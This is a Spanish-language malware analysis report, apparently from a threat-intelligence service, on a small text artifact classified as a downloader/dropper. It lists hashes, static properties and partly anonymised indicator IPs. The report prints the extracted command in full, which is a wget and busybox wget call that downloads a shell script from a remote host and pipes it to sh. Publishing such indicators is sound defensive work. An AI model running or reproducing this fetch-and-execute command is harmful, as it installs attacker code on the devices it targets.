# 🧬 Payload Analysis

`2d65939daa85743a86780d33393bf14a9f0310522fac514b44eb76d30c5003c6`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `2d65939daa85743a86780d33393bf14a9f0310522fac514b44eb76d30c5003c6`
- **MD5:** `3315ecfd8149ddd2ed0ed51ef693e0bc`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 324 B |
| Entropía | 5.18 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
cmd=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s iodata;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s iodata
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| hash | 2d65939daa85743a86780d33393bf14a9f0310522fac514b44eb76d30c5003c6 | static_analysis |
| command | cmd=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s iodata;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s iodata | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
